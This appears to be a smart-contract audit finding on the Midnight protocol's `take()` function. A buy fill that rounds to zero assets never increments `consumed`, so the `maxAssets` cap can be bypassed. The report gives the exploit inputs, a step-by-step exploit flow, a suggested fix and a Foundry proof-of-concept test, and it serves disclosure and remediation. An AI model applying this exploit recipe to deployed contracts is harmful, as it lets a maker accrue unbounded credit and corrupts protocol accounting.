### Title
Buy-offer `consumed` not incremented when `buyerAssets` rounds to zero, allowing unlimited credit accumulation beyond `maxAssets` cap - (`src/Midnight.sol`)

### Summary
When a buy offer has `maxAssets > 0` and `offerPrice < WAD`, a taker can choose `units` small enough that `mulDivDown(units, buyerPrice, WAD) == 0`. Because `consumed` is incremented by `buyerAssets` (not by `units`), it never advances, the `ConsumedAssets` guard always passes, and the maker accumulates credit for an unbounded number of units at zero asset cost. The protocol itself documents this at line 94 of `src/Midnight.sol` ("It is possible to give units to a fully consumed assets-based buy offer with price < 1"), and the existing test `testBugBuyMaxAssetsBypass` reproduces it exactly.

### Finding Description

**Code path** — `src/Midnight.sol`, `take()`, lines 363–369:

```solidity
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)   // ← rounds DOWN; can be 0
    : units.mulDivUp(buyerPrice, WAD);

uint256 newConsumed;
if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy
        ? buyerAssets          // ← += 0 when rounding kills it
        : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());  // always passes
}
``` [1](#0-0) 

**Root cause** — For a buy offer the consumed counter tracks *assets paid*, not *units filled*. When `units * buyerPrice < WAD`, integer division truncates `buyerAssets` to 0, so `consumed` is unchanged and the cap check is trivially satisfied.

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.maxAssets > 0` (maker's own offer, or any ratified offer)
- `offer.tick` chosen so `offerPrice = PRICE_ROUNDING_STEP = 1e12` (minimum representable price, achievable at `tick = MAX_TICK`)
- `units = WAD / PRICE_ROUNDING_STEP - 1 = 999_999` → `buyerAssets = mulDivDown(999_999, 1e12, 1e18) = 0` [2](#0-1) 

**Exploit flow:**
1. Maker posts a buy offer with `maxAssets = N` (any value ≥ 1) at a low tick.
2. Taker calls `take(offer, ..., units=999_999, ...)` repeatedly.
3. Each call: `buyerAssets = 0`, `consumed` stays at 0, `require(0 <= N)` passes.
4. Maker's `credit` increases by `units` per call (line 410); `totalUnits` grows (line 416–417); taker's debt grows.
5. No assets are transferred (lines 455–456 transfer 0). [3](#0-2) 

**Why existing checks fail:**
- `require(newConsumed <= offer.maxAssets)` — passes because `newConsumed` never increases.
- No `require(units == 0 || buyerAssets > 0)` guard exists.
- No minimum-units check exists anywhere in `take()`.
- `SafeTransferLib.safeTransferFrom(..., 0)` does not revert on standard ERC-20s. [4](#0-3) 

The existing test `testBugBuyMaxAssetsBypass` already proves the path is live: [5](#0-4) 

### Impact Explanation
The maker's credit grows without bound beyond the `maxAssets` cap, at zero asset cost per fill. Any group-shared offer cap (`offer.group`) is equally bypassed. The invariant "offers cannot be overfilled" is broken: total units credited to the maker can be arbitrarily large while `consumed` stays at or below `maxAssets`. A second-order effect is that `totalUnits` and the market's accounting diverge from actual token balances.

### Likelihood Explanation
- **Preconditions:** buy offer with `offerPrice < WAD` (any tick below the midpoint) and `maxAssets > 0`. Both are normal, intended configurations.
- **Feasibility:** No special role, signature, or oracle value is required. Any address that is not the maker can be the taker.
- **Repeatability:** Each call leaves `consumed` unchanged, so the attack can be repeated indefinitely in the same transaction via `multicall` or across blocks.
- **Cost to attacker:** The taker accumulates debt without receiving assets, which is self-harmful. However, a maker-controlled second address acting as taker, or a taker who immediately repays, can exploit this at negligible net cost.

### Recommendation
Add a guard that rejects a non-zero-unit fill that produces zero assets when `maxAssets > 0`:

```solidity
if (offer.maxAssets > 0) {
    uint256 assetsDelta = offer.buy ? buyerAssets : sellerAssets;
    require(units == 0 || assetsDelta > 0, ZeroAssetFill());
    newConsumed = consumed[offer.maker][offer.group] += assetsDelta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

Alternatively, track consumed in *units* even in assets-mode and convert only for the cap comparison, or enforce a minimum `units` such that `mulDivDown(units, minPrice, WAD) >= 1`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Offer} from "src/Midnight.sol";
import {TickLib, PRICE_ROUNDING_STEP, MAX_TICK} from "src/libraries/TickLib.sol";
import {WAD} from "src/libraries/ConstantsLib.sol";

contract BuyMaxAssetsBypassTest is BaseTest {
    function testConsumedStaysZeroAfterFill() public {
        // offerPrice = PRICE_ROUNDING_STEP = 1e12 (tick = MAX_TICK)
        lenderOffer.tick      = MAX_TICK;          // tickToPrice → 1e12
        lenderOffer.maxUnits  = 0;
        lenderOffer.maxAssets = 1;                 // cap: 1 asset unit

        uint256 offerPrice = TickLib.tickToPrice(MAX_TICK); // == 1e12
        // units chosen so mulDivDown(units, offerPrice, WAD) == 0
        uint256 units = WAD / offerPrice - 1;      // == 999_999

        deal(address(loanToken), borrower, 0);     // taker has no tokens
        collateralize(market, borrower, units * 2);

        uint256 consumedBefore = midnight.consumed(lender, lenderOffer.group);
        assertEq(consumedBefore, 0);

        // First fill: buyerAssets = mulDivDown(999_999, 1e12, 1e18) = 0
        (uint256 buyerAssets,) = take(units, borrower, lenderOffer);
        assertEq(buyerAssets, 0);

        // KEY ASSERTION: consumed did not advance despite units being filled
        assertEq(midnight.consumed(lender, lenderOffer.group), 0);

        // Maker credit grew beyond what maxAssets=1 should allow
        assertGt(midnight.creditOf(id, lender), 0);

        // Second fill: still passes — cap is never reached
        (uint256 buyerAssets2,) = take(units, borrower, lenderOffer);
        assertEq(buyerAssets2, 0);
        assertEq(midnight.consumed(lender, lenderOffer.group), 0);
        // Credit doubled with zero asset cost
        assertGt(midnight.creditOf(id, lender), units);
    }
}
```

**Expected assertions:**
- `buyerAssets == 0` on every call
- `consumed(lender, group) == 0` after each fill (never increments)
- `creditOf(id, lender)` grows by `units` per call, unboundedly
- No token transfer occurs (`loanToken.balanceOf` unchanged)
